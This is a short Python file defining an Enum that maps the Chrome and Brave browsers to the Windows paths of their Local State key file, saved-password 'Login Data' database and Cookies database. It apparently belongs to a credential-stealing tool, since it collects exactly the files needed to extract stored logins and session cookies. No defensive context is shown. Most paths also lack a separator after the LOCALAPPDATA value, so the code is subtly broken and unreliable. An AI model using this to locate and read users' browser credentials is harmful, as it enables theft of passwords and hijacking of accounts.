import os
from enum import Enum

class Browsers(Enum):

    Chrome = {
        'state': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Local State',
        'login': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Default\\Login Data',
        'cookies': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Default\\Cookies'
    }

    Brave = {
        'state': f'{os.environ["LOCALAPPDATA"]}BraveSoftware\\Brave-Browser\\User Data\\Local State',
        'login': f'{os.environ["LOCALAPPDATA"]}BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
        'cookies': f'{os.environ["LOCALAPPDATA"]}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies'
    }
